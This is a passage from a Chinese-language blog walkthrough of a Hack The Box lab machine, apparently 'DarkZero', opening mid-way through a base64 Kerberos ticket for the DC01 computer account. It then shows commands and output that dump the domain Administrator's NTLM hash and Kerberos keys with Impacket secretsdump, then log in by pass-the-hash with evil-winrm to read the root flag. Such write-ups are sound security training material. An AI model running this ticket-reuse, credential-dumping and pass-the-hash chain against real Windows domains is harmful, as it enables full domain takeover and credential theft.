class="line">doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDb6aEcZRQqDpmDRj+2yO9qFAFw6K4JD26PDedup8TsCryZPT5kUxT5/xDJPwYg+QuuovP8O7XsUZCP1bfFEAbs+sdKFqjq2vdp6ElSu3RXcOgC26Kj3mPcqYbIjg3uW/LpUh3JSGOdAacGCuHhZs7RkOm/MWeQAv9bqv3IHELly+lBwW7UZNfUDwDTDOfbL36JxlPO4Cch37+aOKHgfTopzxFYrDFjNQHNT3h5xOL/0r6gkJ1APc0uxkqdFh9N2OyXPD9lFWwojEYpoDUSdhERgkrWpZ+nJInUh+j7528TX8H4VA/aGMhHvsQIYozut6YVGYk1bRDLxkDNsUX2dJORE+JEeN03haQIU/zY3eMPPIzQdkTLv+oQZgxCm9dw+KY0CSVnHxi3J01Nk2OeTpBotbFIBitd6eORRmfDe6MTiC1v9IFc39v9mtuH1D/mxLrzwzN5LoAsIvFeBma56Vp34CyoirVdUjHkpjM3ksdPX9fhBANYB6D9xDWel/k4E6edm4K//uUELDNdT7eZPMZS936SYgf6C3Wy8iL/orWGhWwRygKsmgDh+Gi6xIDtvFeYqctR/MhwTXTSGmaOiyum6eQha70n33tbEq7aTa30hnAng86WT48e7LV6RhhKZpB6RwK6q7k0Z9pKIalvpUPt2nXveaRVUzX7lH1u2enyMuXqicr3P4GZHRsQRprU4coP8VZ+weyJz/EY50ybzpaqpDIjiMqw0QyG6/6cCh9DLaTLq6O9mGb7elZ7TewHvut7RG+FyoivTYrDFyPMNQt8SoL3bzXfv+Z55wEA6Tyyny6rIxYgtWyo2Kaek0fOq9nyG44bIZho0yp7xbdyD8VMx3Hzxgk+nYkqt/iyY/h120IzXWEmj3FqcLIqG3WI0JCFFS6Q9ezUpRGAwwBi9ej/8FkqWBEe/KU5OXWhA75vvA/UXCWlqF3mMKkS9iJD9LDfF2wh0xygP8yzXng7QsqR/W1ZEXsnv+WiUxH65am5y+JM7c98Ah+bhG8mB6GxpekYB/6PLAiGGuoLgHLWWAsgt/LGX24Lal8fk0kdwJrmVFaxOlb5pDwgoMNoFXOcQDMnTrTliGbCTxvt9NIwt7buSVySOjkCbwCVgF91edYMc1TuorwWelGaL/1F8D8VsPP6yZ9S/ZBpV83M7ZxvDzPwzA/GwcV4np7PLMzc2n3itg52ZefWAF1nLBD76Ta6IbT1XFhA4iPSAh07lqQG/5fiELprf1IMMyxMXxNye15wr0LFcVE/dRYclFJj42WWrlnFjj9mkVFokydwnJOJcJ/aWC2vna84Pe99c5yFzO4e8fb3N6Rzup50PTgJyzH5cwIowmL8Es21hiYJloXQahhU2HPYGyZa+GDnckB1q6Lp7xrPdiMtUEOX1dUmJi66nCySvakksYICGNbEs+shBfPTnvdz4mzQzo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgRH3wM8L0TE8gvyChNHmByZnJXLduqj0gvfN2NLLEO0OhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMTEyMTM3MTVaphEYDzIwMjUxMDEyMDczNzE1WqcRGA8yMDI1MTAxODIxMzcxNVqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=</span><br></pre></td></tr></table></figure>
+
+<p>导入后尝试 dump administrator 的 hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> xxxxxxx | <span class="built_in">base64</span> -d &gt; dc01.kirbi</span><br><span class="line">$ ticketConverter.py dc01.kirbi dc01.ccache</span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=dc01.ccache</span><br><span class="line">$ ntpdate -u 10.10.11.89 &amp;&amp; secretsdump.py <span class="string">&#x27;DARKZERO.HTB/DC01$&#x27;</span>@dc01.darkzero.htb -k -no-pass -just-dc-user Administrator -dc-ip 10.10.11.89</span><br><span class="line">11 Oct xx:xx:10 ntpdate[2353338]: adjust time server 10.10.11.89 offset +0.000457 sec</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd</span><br><span class="line">Administrator:0x13:a23315d970fe9d556be03ab611730673</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362</span><br><span class="line">Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>pass-the-hash 连接 DC01</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.darkzero.htb -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">070693d6b0242a44d21f2ced3040c2f2</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/03/Season9-Imagery/" rel="prev" title="[Season9] ImageryWP">
+                  <i class="fa fa-angle-left"></i> [Season9] ImageryWP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">l1nk</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
